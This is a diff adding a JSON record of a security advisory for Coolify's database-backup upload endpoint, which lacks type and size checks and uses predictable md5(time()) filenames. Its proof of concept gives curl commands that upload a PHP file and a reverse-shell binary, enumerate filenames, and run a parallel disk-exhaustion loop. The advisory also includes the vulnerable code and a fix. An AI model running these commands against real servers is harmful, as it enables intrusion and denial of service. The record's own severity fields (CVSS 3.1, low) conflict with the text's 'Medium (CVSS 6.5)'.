@@ -1,0 +1,48 @@
+{
+  "global": null,
+  "id": "GHSA-66gv-g2w9-6wxp",
+  "repo": {
+    "cve_id": "CVE-2026-42145",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 3.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "## Summary\nThe file upload endpoint for database backup restoration accepts any file type and size without validation. Combined with predictable filename generation using `md5(time())`, an attacker can upload arbitrary files and predict their storage location.\n\n## Details\n\n### Vulnerable Code\n\n**`app/Http/Controllers/UploadController.php`:**\n```php\npublic function upload(Request $request)\n{\n    // No file validation at all!\n    $receiver = new FileReceiver('file', $request, HandlerFactory::classFromRequest($request));\n    $save = $receiver->receive();\n    if ($save->isFinished()) {\n        return $this->saveFile($save->getFile(), $databaseIdentifier);\n    }\n}\n\nprotected function saveFile(UploadedFile $file, string $resourceIdentifier)\n{\n    $filePath = \"upload/{$resourceIdentifier}\";\n    $finalPath = storage_path('app/'.$filePath);\n    \n    // Predictable filename generation\n    $filename = $file->getClientOriginalName();\n    $filename .= '_'.md5(time()).'.'.$extension;  // md5(time()) is predictable!\n    \n    $file->move($finalPath, 'restore');  // Fixed filename 'restore'\n}\n```\n\n### Root Cause\n1. **No MIME type validation** - any file type is accepted (PHP, executable, etc.)\n2. **No file size validation** - relies only on PHP/server config (potentially hundreds of MB)\n3. **No content inspection** - uploaded files are stored directly without scanning\n4. **Predictable filenames** - `md5(time())` uses the Unix timestamp, which is known to the attacker\n\n## PoC\n\n### Prerequisites\n- Coolify v4.0.0-beta.468\n- Authenticated user with database management permissions\n- A deployed database service\n\n### Steps to Reproduce\n\n#### Scenario 1: Upload Arbitrary File Types\n\n```bash\n# Upload a PHP file disguised as a database backup\n# The endpoint accepts ANY file type\ncurl -X POST 'https://coolify.example.com/upload/backup/DATABASE_UUID' \\\n  -H 'Cookie: session_cookie' \\\n  -F 'file=@malicious.php;type=application/octet-stream'\n\n# Upload an executable\ncurl -X POST 'https://coolify.example.com/upload/backup/DATABASE_UUID' \\\n  -H 'Cookie: session_cookie' \\\n  -F 'file=@reverse_shell.elf;type=application/octet-stream'\n\n# Upload a massive file (no size limit at app level)\ndd if=/dev/zero bs=1M count=1024 | curl -X POST \\\n  'https://coolify.example.com/upload/backup/DATABASE_UUID' \\\n  -H 'Cookie: session_cookie' \\\n  -F 'file=@-;filename=huge_file.sql'\n\n# Result: All files are accepted and stored without validation\n```\n\n#### Scenario 2: Predict Upload Filename\n\n```bash\n# The filename uses md5(time()) which is the current Unix timestamp\n# Attacker knows the approximate upload time\n\nTIMESTAMP=$(date +%s)\nPREDICTED_HASH=$(echo -n $TIMESTAMP | md5sum | cut -d' ' -f1)\necho \"Predicted filename component: $PREDICTED_HASH\"\n\n# With a window of ±5 seconds, attacker generates ~10 possible filenames:\nfor t in $(seq $((TIMESTAMP-5)) $((TIMESTAMP+5))); do\n  echo \"Possible: original_name_$(echo -n $t | md5sum | cut -d' ' -f1).sql\"\ndone\n\n# Result: Attacker can enumerate and predict stored filenames\n```\n\n#### Scenario 3: Disk Space Exhaustion (DoS)\n\n```bash\n# No file size limit - upload repeatedly to fill disk\nfor i in $(seq 1 100); do\n  dd if=/dev/urandom bs=100M count=1 2>/dev/null | \\\n  curl -s -X POST 'https://coolify.example.com/upload/backup/DATABASE_UUID' \\\n    -H 'Cookie: session_cookie' \\\n    -F 'file=@-;filename=backup_'$i'.sql' &\ndone\nwait\n\n# Result: 10GB+ uploaded, potentially filling the server's disk\n# This can crash the database, stop deployments, and take down Coolify\n```\n\n## Impact\n**Severity: Medium (CVSS 6.5)**\n\n- **Arbitrary File Upload:** Any file type stored on the server\n- **Disk Space Exhaustion:** No size limits enable DoS via disk filling\n- **File Path Prediction:** `md5(time())` allows attackers to predict filenames\n- **Potential RCE:** If uploaded files are later processed or served, malicious content could execute\n\n**Who is affected:**\n- All Coolify instances running v4.0.0-beta.468 or earlier\n- Any authenticated user with database management access\n\n**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)\n\n## Recommended Fix\n```php\n// Add validation in the upload method:\n$request->validate([\n    'file' => 'required|file|max:512000|mimes:sql,gz,zip,tar,dump',\n]);\n\n// Replace predictable filename:\n$filename .= '_'.bin2hex(random_bytes(16)).'.'.$extension;\n```\n\n## Affected Version\nv4.0.0-beta.468 and earlier",
+    "ghsa_id": "GHSA-66gv-g2w9-6wxp",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-66gv-g2w9-6wxp",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-66gv-g2w9-6wxp"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-42145"
+      }
+    ],
+    "published_at": "2026-07-02T16:39:03Z",
+    "references": [],
+    "severity": "low",
+    "summary": "File Upload Without Type or Size Validation in Database Backup Restore",
+    "updated_at": "2026-07-02T16:39:03Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": "4.0.0-beta.474",
+        "vulnerable_version_range": "< 4.0.0-beta.474"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
